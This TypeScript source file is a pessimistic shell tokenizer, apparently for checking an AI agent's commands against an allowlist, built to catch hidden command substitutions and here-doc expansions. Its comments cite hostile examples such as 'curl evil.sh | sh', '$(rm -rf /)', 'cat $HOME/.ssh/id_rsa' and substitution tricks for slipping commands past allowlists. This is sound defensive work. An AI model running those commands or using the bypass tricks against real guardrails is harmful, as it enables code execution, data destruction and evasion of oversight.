/**
 * A POSIX-shell-aware tokenizer.
 *
 * This exists because matching commands with regexes is the single most common
 * way an allowlist gets bypassed. `git status` and
 * `git status; curl evil.sh | sh` both start with `git status`. Prefix matching
 * cannot tell them apart; a tokenizer can.
 *
 * The tokenizer is deliberately *pessimistic*. Anything it cannot account for
 * sets an issue, and an issue eventually means "ask the human". We would rather
 * be occasionally annoying than confidently wrong.
 *
 * Scope: bash/sh syntax as agents actually emit it. We do not implement a full
 * shell grammar — we implement enough to know, reliably, *which programs run
 * with which arguments*, and to notice when we can't tell.
 */

export type QuoteKind = 'none' | 'single' | 'double' | 'ansi' | 'mixed';

/** Marker char standing in for a value we could not resolve statically. */
export const UNRESOLVED = '';

export interface Expansion {
  kind: 'param' | 'command' | 'arith' | 'process' | 'glob' | 'brace' | 'tilde';
  /** Raw source of the expansion, e.g. `$(whoami)`. */
  raw: string;
  /** For command/process substitution: the inner source, for recursive parsing. */
  inner?: string;
  /** For params: the variable name. */
  name?: string;
  /** True if we resolved it to a literal (e.g. $HOME with a known home dir). */
  resolved?: boolean;
}

export interface Token {
  type: 'word' | 'op' | 'newline' | 'comment';
  /**
   * Best-effort literal text. Unresolvable expansions are replaced with
   * {@link UNRESOLVED} so that downstream path logic cannot mistake
   * `$SOMETHING/etc` for a real relative path.
   */
  text: string;
  /** Exact source slice. */
  raw: string;
  quote: QuoteKind;
  expansions: Expansion[];
  /** Byte offset in the source. */
  start: number;
  end: number;
}

export interface TokenizeResult {
  tokens: Token[];
  /** False when we hit something we could not tokenize faithfully. */
  ok: boolean;
  issues: string[];
  /**
   * Substitutions found inside here-document bodies whose delimiter was
   * unquoted. `cat <<EOF` expands its body, so `$(rm -rf /)` in there really
   * runs — but the body is not a word and never reaches the word reader, so
   * without this it is invisible. A quoted delimiter (`<<'EOF'`) makes the body
   * literal and contributes nothing here.
   */
  heredocSubstitutions: Expansion[];
}

/**
 * Find command and process substitutions anywhere in a string.
 *
 * Used for the places where shell code hides inside something that is not a
 * plain word: a `${...}` operator body, an arithmetic expression, a here-doc.
 * Single-quoted runs are skipped because they are literal; double-quoted runs
 * are not, because `"$(x)"` still runs `x`.
 */
export interface ScanResult {
  found: Expansion[];
  /**
   * False when the scan gave up partway — an unterminated quote or bracket.
   *
   * This is the difference between "there is nothing here" and "I could not
   * read this", and conflating the two is how an apostrophe in a here-doc body
   * hid every command after it. A caller that sees `complete: false` must treat
   * the enclosing command as not understood.
   */
  complete: boolean;
}

export interface ScanOptions {
  /**
   * Whether `'` starts a literal run. True inside ordinary shell text; FALSE
   * inside a here-document body or a double-quoted region, where an apostrophe
   * is just a character. Getting this wrong in the permissive direction makes
   * `it's fine` swallow the rest of the body.
   */
  quotingApplies?: boolean;
}

/**
 * Find command and process substitutions anywhere in a string.
 *
 * Used for every place shell code hides inside something that is not a plain
 * word: a `${...}` operator body, an arithmetic expression, a here-doc, a
 * double-quoted region. One implementation, because two drifted apart once
 * already and the copy without the fix was the one an attacker could reach.
 */
export function scanSubstitutions(s: string, opts: ScanOptions = {}): ScanResult {
  const quoting = opts.quotingApplies !== false;
  const out: Expansion[] = [];
  let j = 0;
  const give = (): ScanResult => ({ found: out, complete: false });

  while (j < s.length) {
    const c = s[j]!;
    if (c === '\\') {
      j += 2;
      continue;
    }
    if (quoting && c === "'") {
      const e = s.indexOf("'", j + 1);
      if (e === -1) return give();
      j = e + 1;
      continue;
    }
    if (quoting && c === '"') {
      // A double-quoted span: an apostrophe inside it is an ordinary character,
      // and `$(...)` still runs. Scanning it with quoting off is the only way
      // `${U:-"it's" $(curl x)}` reports the curl.
      let e = j + 1;
      while (e < s.length) {
        if (s[e] === String.fromCharCode(92)) {
          e += 2;
          continue;
        }
        if (s[e] === '"') break;
        e++;
      }
      if (e >= s.length) return give();
      const inner = scanSubstitutions(s.slice(j + 1, e), { quotingApplies: false });
      out.push(...inner.found);
      if (!inner.complete) return give();
      j = e + 1;
      continue;
    }
    if (c === '$' && s[j + 1] === '(' && s[j + 2] === '(') {
      const e = balancedIn(s, j + 2, '(', ')', quoting);
      if (e === -1) return give();
      const inner = scanSubstitutions(s.slice(j + 3, Math.max(j + 3, e - 1)), opts);
      out.push(...inner.found);
      if (!inner.complete) return give();
      j = e + 1;
      continue;
    }
    if (c === '$' && s[j + 1] === '(') {
      const e = balancedIn(s, j + 1, '(', ')', quoting);
      if (e === -1) return give();
      out.push({ kind: 'command', raw: s.slice(j, e), inner: s.slice(j + 2, e - 1) });
      j = e;
      continue;
    }
    if (c === '$' && s[j + 1] === '{') {
      const e = balancedIn(s, j + 1, '{', '}', quoting);
      if (e === -1) return give();
      const inner = scanSubstitutions(s.slice(j + 2, Math.max(j + 2, e - 1)), opts);
      out.push(...inner.found);
      if (!inner.complete) return give();
      j = e;
      continue;
    }
    if (c === '`') {
      const e = s.indexOf('`', j + 1);
      if (e === -1) return give();
      out.push({ kind: 'command', raw: s.slice(j, e + 1), inner: s.slice(j + 1, e) });
      j = e + 1;
      continue;
    }
    if ((c === '<' || c === '>') && s[j + 1] === '(') {
      const e = balancedIn(s, j + 1, '(', ')', quoting);
      if (e === -1) return give();
      out.push({ kind: 'process', raw: s.slice(j, e), inner: s.slice(j + 2, e - 1) });
      j = e;
      continue;
    }
    j++;
  }
  return { found: out, complete: true };
}

/** Back-compatible helper for callers that only want the list. */
export function findSubstitutions(s: string, opts: ScanOptions = {}): Expansion[] {
  return scanSubstitutions(s, opts).found;
}

/**
 * Did a balanced scan stop early?
 *
 * `$(case x in x) cmd;; esac)` is the pathological case: a `case` pattern ends
 * with an unmatched `)`, which closes the substitution as far as bracket
 * counting is concerned, so the extracted body is a truncated fragment. Bash
 * resolves this with grammar context we do not have, so we notice and refuse
 * rather than guess.
 *
 * Only `case` is checked, because only `case` produces that unmatched `)`.
 * `if`/`do` nest normally, and a keyword-count heuristic over those would fire
 * on ordinary arguments like `--if-present`.
 */
export function looksTruncated(inner: string): boolean {
  const opens = (inner.match(/(^|[\s;&|(])case\s/g) ?? []).length;
  const closes = (inner.match(/(^|[\s;&|(])esac(\s|;|$)/g) ?? []).length;
  return opens > closes;
}

/** Balanced-bracket scan over an arbitrary string. */
function balancedIn(s: string, from: number, open: string, close: string, quoting = true): number {
  let depth = 0;
  let j = from;
  while (j < s.length) {
    const ch = s[j]!;
    if (ch === '\\') {
      j += 2;
      continue;
    }
    if (quoting && ch === "'") {
      const e = s.indexOf("'", j + 1);
      if (e === -1) return -1;
      j = e + 1;
      continue;
    }
    if (ch === open) {
      depth++;
      j++;
      continue;
    }
    if (ch === close) {
      depth--;
      j++;
      if (depth === 0) return j;
      continue;
    }
    j++;
  }
  return -1;
}

export interface TokenizeOptions {
  /**
   * Values for the small set of variables we are willing to resolve.
   * Resolving `$HOME` matters: `cat $HOME/.ssh/id_rsa` must be recognised as a
   * secret read. Resolving arbitrary variables would be a lie, so we don't.
   */
  env?: Record<string, string | undefined>;
  /** Home directory used for `~` expansion. */
  home?: string;
}

/** Variables safe (and useful) to resolve statically. */
const RESOLVABLE = new Set(['HOME', 'USERPROFILE', 'PWD', 'TMPDIR', 'TEMP', 'TMP', 'HOMEPATH']);

const OPERATORS = [
  '<<<',
  '&>>',
  ';;&',
  '|&',
  '||',
  '&&',
  '>>',
  '<<',
  // `>|` (clobber override) must be matched before the bare `>`, or it
  // tokenizes as a redirect followed by a *pipe* and the redirect target is
  // reported as a program that runs.
  '>|',
  '>&',
  '<&',
  '<>',
  ';;',
  '&>',
  '|',
  '&',
  ';',
  '<',
  '>',
  '(',
  ')',
];

const isBlank = (c: string) => c === ' ' || c === '\t' || c === '\r';
const isNameStart = (c: string) => /[A-Za-z_]/.test(c);
const isNameChar = (c: string) => /[A-Za-z0-9_]/.test(c);

export function tokenize(src: string, opts: TokenizeOptions = {}): TokenizeResult {
  const env = opts.env ?? {};
  const home = opts.home ?? env['HOME'] ?? env['USERPROFILE'] ?? '';
  const tokens: Token[] = [];
  const issues: string[] = [];
  let ok = true;
  let i = 0;
  const n = src.length;

  /** Pending here-doc bodies to consume at the next newline. */
  const pendingHeredocs: { delim: string; stripTabs: boolean; quoted: boolean }[] = [];
  const heredocSubstitutions: Expansion[] = [];

  const fail = (msg: string) => {
    ok = false;
    if (!issues.includes(msg)) issues.push(msg);
  };

  /**
   * Scan a balanced construct starting at `from` where src[from] === open.
   * Handles nesting and quoting. Returns the index just past the closer, or -1.
   */
  function matchBalanced(from: number, open: string, close: string): number {
    let depth = 0;
    let j = from;
    while (j < n) {
      const c = src[j]!;
      if (c === '\\') {
        j += 2;
        continue;
      }
      if (c === "'") {
        const e = src.indexOf("'", j + 1);
        if (e === -1) return -1;
        j = e + 1;
        continue;
      }
      if (c === '"') {
        j = skipDoubleQuoted(j);
        if (j === -1) return -1;
        continue;
      }
      if (c === open) {
        depth++;
        j++;
        continue;
      }
      if (c === close) {
        depth--;
        j++;
        if (depth === 0) return j;
        continue;
      }
      j++;
    }
    return -1;
  }

  /** Skip a double-quoted string starting at src[from] === '"'. Returns index past closer or -1. */
  function skipDoubleQuoted(from: number): number {
    let j = from + 1;
    while (j < n) {
      const c = src[j]!;
      if (c === '\\') {
        j += 2;
        continue;
      }
      if (c === '$' && src[j + 1] === '(') {
        const e = matchBalanced(j + 1, '(', ')');
        if (e === -1) return -1;
        j = e;
        continue;
      }
      if (c === '`') {
        const e = src.indexOf('`', j + 1);
        if (e === -1) return -1;
        j = e + 1;
        continue;
      }
      if (c === '"') return j + 1;
      j++;
    }
    return -1;
  }

  /**
   * Read one word starting at i. Returns the token, advancing i.
   * A "word" accumulates across adjacent quoted and unquoted runs, exactly as
   * the shell does: `a"b"c` is one word `abc`.
   */
  function readWord(): Token {
    const start = i;
    let text = '';
    const expansions: Expansion[] = [];
    const quotes = new Set<QuoteKind>();

    while (i < n) {
      const c = src[i]!;

      if (isBlank(c) || c === '\n') break;

      // Process substitution `<(...)` / `>(...)`. This has to be tested before
      // the operator scan below, which would otherwise see the bare `<` and
      // stop, leaving the redirect to swallow the `(` and the parser to read
      // the body as an ordinary subshell.
      if ((c === '<' || c === '>') && src[i + 1] === '(') {
        const e = matchBalanced(i + 1, '(', ')');
        if (e === -1) {
          fail('unterminated process substitution');
          i = n;
          break;
        }
        expansions.push({
          kind: 'process',
          raw: src.slice(i, e),
          inner: src.slice(i + 2, e - 1),
        });
        text += UNRESOLVED;
        i = e;
        continue;
      }

      // Operators terminate a word, except when escaped/quoted (handled below).
      if (matchOperatorAt(i)) break;
      if (c === '#' && i === start) break; // comment only at word start

      if (c === '\\') {
        const next = src[i + 1];
        if (next === '\n') {
          i += 2; // line continuation
          continue;
        }
        if (next === undefined) {
          text += '\\';
          i++;
          continue;
        }
        text += next;
        i += 2;
        quotes.add('none');
        continue;
      }

      if (c === "'") {
        const e = src.indexOf("'", i + 1);
        if (e === -1) {
          fail('unterminated single quote');
          text += src.slice(i + 1);
          i = n;
          break;
        }
        text += src.slice(i + 1, e);
        i = e + 1;
        quotes.add('single');
        continue;
      }

      if (c === '$' && src[i + 1] === "'") {
        // ANSI-C quoting: $'...\n...' — escapes are interpreted.
        const e = findAnsiCEnd(i + 2);
        if (e === -1) {
          fail('unterminated $\'...\' quote');
          i = n;
          break;
        }
        text += decodeAnsiC(src.slice(i + 2, e));
        i = e + 1;
        quotes.add('ansi');
        continue;
      }

      if (c === '"') {
        const e = skipDoubleQuoted(i);
        if (e === -1) {
          fail('unterminated double quote');
          i = n;
          break;
        }
        const innerRaw = src.slice(i + 1, e - 1);
        text += expandDoubleQuoted(innerRaw, expansions);
        i = e;
        quotes.add('double');
        continue;
      }

      if (c === '$' || c === '`') {
        const before = i;
        const piece = readExpansion(expansions);
        if (i === before) {
          // Not a recognised expansion; treat `$` literally.
          text += c;
          i++;
        } else {
          text += piece;
        }
        continue;
      }

      if (c === '~' && text === '' && home) {
        // Tilde only expands at the start of a word.
        const rest = src.slice(i + 1);
        if (rest === '' || /^[/\s:]/.test(rest)) {
          text += home;
          expansions.push({ kind: 'tilde', raw: '~', resolved: true });
          i++;
          continue;
        }
      }

      if (c === '*' || c === '?' || c === '[') {
        expansions.push({ kind: 'glob', raw: c });
        text += c;
        i++;
        continue;
      }

      if (c === '{' && /[^{}]*,[^{}]*\}/.test(src.slice(i, i + 200))) {
        expansions.push({ kind: 'brace', raw: '{' });
        text += c;
        i++;
        continue;
      }

      text += c;
      i++;
    }

    const quote: QuoteKind =
      quotes.size === 0 ? 'none' : quotes.size === 1 ? [...quotes][0]! : 'mixed';

    return {
      type: 'word',
      text,
      raw: src.slice(start, i),
      quote,
      expansions,
      start,
      end: i,
    };
  }

  function findAnsiCEnd(from: number): number {
    let j = from;
    while (j < n) {
      if (src[j] === '\\') {
        j += 2;
        continue;
      }
      if (src[j] === "'") return j;
      j++;
    }
    return -1;
  }

  function decodeAnsiC(s: string): string {
    return s.replace(/\\(x[0-9a-fA-F]{1,2}|[0-7]{1,3}|u[0-9a-fA-F]{1,4}|.)/g, (_m, esc: string) => {
      const map: Record<string, string> = {
        n: '\n',
        t: '\t',
        r: '\r',
        a: '\x07',
        b: '\b',
        f: '\f',
        v: '\v',
        '\\': '\\',
        "'": "'",
        '"': '"',
        e: '\x1b',
        E: '\x1b',
        '0': '\0',
      };
      if (esc.startsWith('x')) return String.fromCharCode(parseInt(esc.slice(1), 16));
      if (esc.startsWith('u')) return String.fromCharCode(parseInt(esc.slice(1), 16));
      if (/^[0-7]+$/.test(esc)) return String.fromCharCode(parseInt(esc, 8));
      return map[esc] ?? esc;
    });
  }

  /**
   * Read an expansion at `i` ($VAR, ${...}, $(...), $((...)), `...`).
   * Appends to `into` and returns the literal text contribution.
   */
  function readExpansion(into: Expansion[]): string {
    const c = src[i]!;

    if (c === '`') {
      let j = i + 1;
      while (j < n && src[j] !== '`') {
        if (src[j] === '\\') j++;
        j++;
      }
      if (j >= n) {
        fail('unterminated backtick substitution');
        i = n;
        return UNRESOLVED;
      }
      into.push({ kind: 'command', raw: src.slice(i, j + 1), inner: src.slice(i + 1, j) });
      i = j + 1;
      return UNRESOLVED;
    }

    if (c !== '$') return '';

    const next = src[i + 1];

    if (next === '(' && src[i + 2] === '(') {
      const e = matchBalanced(i + 2, '(', ')');
      const e2 = e !== -1 && src[e] === ')' ? e + 1 : e;
      if (e === -1) {
        fail('unterminated arithmetic expansion');
        i = n;
        return UNRESOLVED;
      }
      into.push({ kind: 'arith', raw: src.slice(i, e2) });
      // `$((1+$(cmd)))` runs cmd.
      into.push(...findSubstitutions(src.slice(i + 3, Math.max(i + 3, e2 - 2))));
      i = e2;
      return UNRESOLVED;
    }

    if (next === '(') {
      const e = matchBalanced(i + 1, '(', ')');
      if (e === -1) {
        fail('unterminated command substitution');
        i = n;
        return UNRESOLVED;
      }
      const cmdInner = src.slice(i + 2, e - 1);
      if (looksTruncated(cmdInner)) {
        fail('a command substitution contains a construct this parser cannot delimit reliably');
      }
      into.push({ kind: 'command', raw: src.slice(i, e), inner: cmdInner });
      i = e;
      return UNRESOLVED;
    }

    if (next === '{') {
      const e = matchBalanced(i + 1, '{', '}');
      if (e === -1) {
        fail('unterminated ${...} expansion');
        i = n;
        return UNRESOLVED;
      }
      const body = src.slice(i + 2, e - 1);
      const name = /^[A-Za-z_][A-Za-z0-9_]*$/.test(body) ? body : undefined;
      const val = name && RESOLVABLE.has(name) ? env[name] : undefined;
      into.push({ kind: 'param', raw: src.slice(i, e), name, resolved: val !== undefined });
      // A parameter expansion is not just a name: `${x:=$(cmd)}`, `${x:-$(cmd)}`
      // and `${a[$(cmd)]}` all execute cmd. The operator body is shell code.
      if (!name) into.push(...findSubstitutions(body));
      i = e;
      return val ?? UNRESOLVED;
    }

    if (next !== undefined && isNameStart(next)) {
      let j = i + 1;
      while (j < n && isNameChar(src[j]!)) j++;
      const name = src.slice(i + 1, j);
      const val = RESOLVABLE.has(name) ? env[name] : undefined;
      into.push({ kind: 'param', raw: src.slice(i, j), name, resolved: val !== undefined });
      i = j;
      return val ?? UNRESOLVED;
    }

    // $1, $@, $*, $?, $$, $! and friends — special params, unresolvable.
    if (next !== undefined && /[0-9@*?$!#\-_]/.test(next)) {
      into.push({ kind: 'param', raw: src.slice(i, i + 2), name: next });
      i += 2;
      return UNRESOLVED;
    }

    return '';
  }

  /**
   * Expand the inside of a double-quoted run. Inside double quotes, `$` still
   * expands but whitespace does not split, and `'` is literal.
   */
  /**
   * Expand the inside of a double-quoted run.
   *
   * Discovery of embedded commands is delegated to the one shared scanner. A
   * second, hand-written reader used to live here and silently lacked the
   * `${...}` and `$((...))` handling the main one had — so
   * `echo "${U:-$(curl evil)}"` reported only `echo`. The duplication was the
   * bug; there is now one implementation and this function only reconstructs
   * the literal text.
   *
   * Inside double quotes an apostrophe is an ordinary character, so quoting
   * does not apply to the scan.
   */
  function expandDoubleQuoted(inner: string, into: Expansion[]): string {
    const scan = scanSubstitutions(inner, { quotingApplies: false });
    into.push(...scan.found);
    if (!scan.complete) {
      fail('a double-quoted string contains an expansion this parser could not read to the end');
    }

    let out = '';
    let k = 0;
    while (k < inner.length) {
      const c = inner[k]!;

      if (c === '\\') {
        const nx = inner[k + 1];
        // Inside double quotes, backslash only escapes $ ` " \ and newline.
        if (nx && '$`"\\\n'.includes(nx)) {
          if (nx !== '\n') out += nx;
          k += 2;
          continue;
        }
        out += c;
        k++;
        continue;
      }

      // Skip whole substitutions: they were already recorded by the scan above,
      // and their text is not statically known.
      if (c === '`') {
        const e = inner.indexOf('`', k + 1);
        if (e === -1) break;
        out += UNRESOLVED;
        k = e + 1;
        continue;
      }
      if (c === '$' && (inner[k + 1] === '(' || inner[k + 1] === '{')) {
        const open = inner[k + 1]!;
        const close = open === '(' ? ')' : '}';
        const e = balancedIn(inner, k + 1, open, close, false);
        if (e === -1) break;
        // A bare `${NAME}` we can resolve is worth resolving: it is how
        // `"$HOME/.ssh/id_rsa"` gets recognised as a credential path.
        const body = inner.slice(k + 2, e - 1);
        const name = open === '{' && /^[A-Za-z_][A-Za-z0-9_]*$/.test(body) ? body : undefined;
        const val = name && RESOLVABLE.has(name) ? env[name] : undefined;
        if (name) into.push({ kind: 'param', raw: inner.slice(k, e), name, resolved: val !== undefined });
        out += val ?? UNRESOLVED;
        k = e;
        continue;
      }
      if (c === '$' && inner[k + 1] !== undefined && isNameStart(inner[k + 1]!)) {
        let j = k + 1;
        while (j < inner.length && isNameChar(inner[j]!)) j++;
        const name = inner.slice(k + 1, j);
        const val = RESOLVABLE.has(name) ? env[name] : undefined;
        into.push({ kind: 'param', raw: inner.slice(k, j), name, resolved: val !== undefined });
        out += val ?? UNRESOLVED;
        k = j;
        continue;
      }
      if (c === '$' && inner[k + 1] !== undefined && /[0-9@*?$!#\-_]/.test(inner[k + 1]!)) {
        into.push({ kind: 'param', raw: inner.slice(k, k + 2), name: inner[k + 1]! });
        out += UNRESOLVED;
        k += 2;
        continue;
      }

      out += c;
      k++;
    }
    return out;
  }

  function matchOperatorAt(at: number): string | null {
    for (const op of OPERATORS) {
      if (src.startsWith(op, at)) {
        // `>` preceded by a digit is an fd redirect (`2>`), still an operator.
        return op;
      }
    }
    return null;
  }

  /** Consume here-doc bodies queued by `<<` operators, starting after a newline. */
  function consumeHeredocs() {
    while (pendingHeredocs.length) {
      const hd = pendingHeredocs.shift()!;
      const lines: string[] = [];
      let found = false;
      while (i < n) {
        let eol = src.indexOf('\n', i);
        if (eol === -1) eol = n;
        const line = src.slice(i, eol);
        const cmp = hd.stripTabs ? line.replace(/^\t+/, '') : line;
        i = eol + 1;
        if (cmp === hd.delim) {
          found = true;
          break;
        }
        lines.push(line);
      }
      // An unquoted delimiter means the body is expanded before the command
      // sees it, so any substitution in there runs. A quoted delimiter
      // (`<<'EOF'`) makes the body literal, and scanning it would invent
      // commands that never execute.
      if (!hd.quoted) {
        // An apostrophe in prose ("it's fine") is not a quote inside a here-doc
        // body, and treating it as one hid everything after it.
        const scan = scanSubstitutions(lines.join(String.fromCharCode(10)), { quotingApplies: false });
        heredocSubstitutions.push(...scan.found);
        if (!scan.complete) fail('a here-document body contains an expansion this parser could not read to the end');
      }
      if (!found) fail('unterminated here-document');
    }
  }

  while (i < n) {
    const c = src[i]!;

    if (c === '\n') {
      tokens.push({
        type: 'newline',
        text: '\n',
        raw: '\n',
        quote: 'none',
        expansions: [],
        start: i,
        end: i + 1,
      });
      i++;
      consumeHeredocs();
      continue;
    }

    if (isBlank(c)) {
      i++;
      continue;
    }

    if (c === '\\' && src[i + 1] === '\n') {
      i += 2;
      continue;
    }

    if (c === '#') {
      const prev = tokens[tokens.length - 1];
      const atWordStart = !prev || prev.type !== 'word' || prev.end < i;
      if (atWordStart) {
        let eol = src.indexOf('\n', i);
        if (eol === -1) eol = n;
        tokens.push({
          type: 'comment',
          text: src.slice(i, eol),
          raw: src.slice(i, eol),
          quote: 'none',
          expansions: [],
          start: i,
          end: eol,
        });
        i = eol;
        continue;
      }
    }

    // `<(...)` / `>(...)` beginning a word is process substitution, not a
    // redirect. The operator scan below runs before readWord ever sees the
    // character, so it has to be dispatched here.
    if ((c === '<' || c === '>') && src[i + 1] === '(') {
      tokens.push(readWord());
      continue;
    }

    // fd-prefixed redirect, e.g. `2>&1`
    const fdMatch = /^(\d+)(>>|>&|>\||<&|<>|>|<)/.exec(src.slice(i, i + 8));
    if (fdMatch && (tokens.length === 0 || tokens[tokens.length - 1]!.end < i)) {
      const raw = fdMatch[0];
      tokens.push({
        type: 'op',
        text: raw,
        raw,
        quote: 'none',
        expansions: [],
        start: i,
        end: i + raw.length,
      });
      i += raw.length;
      continue;
    }

    const op = matchOperatorAt(i);
    if (op) {
      tokens.push({
        type: 'op',
        text: op,
        raw: op,
        quote: 'none',
        expansions: [],
        start: i,
        end: i + op.length,
      });
      i += op.length;

      if (op === '<<') {
        // Queue a here-doc; the delimiter is the next word.
        while (i < n && isBlank(src[i]!)) i++;
        let stripTabs = false;
        if (src[i] === '-') {
          stripTabs = true;
          i++;
        }
        const delimTok = readWord();
        tokens.push(delimTok);
        pendingHeredocs.push({
          delim: delimTok.text,
          stripTabs,
          quoted: delimTok.quote !== 'none',
        });
      }
      continue;
    }

    const before = i;
    const w = readWord();
    if (i === before) {
      // Defensive: never spin. Consume one char and flag.
      fail(`unrecognised character ${JSON.stringify(c)}`);
      i++;
      continue;
    }
    tokens.push(w);
  }

  if (pendingHeredocs.length) {
    consumeHeredocs();
  }

  return { tokens, ok, issues, heredocSubstitutions };
}
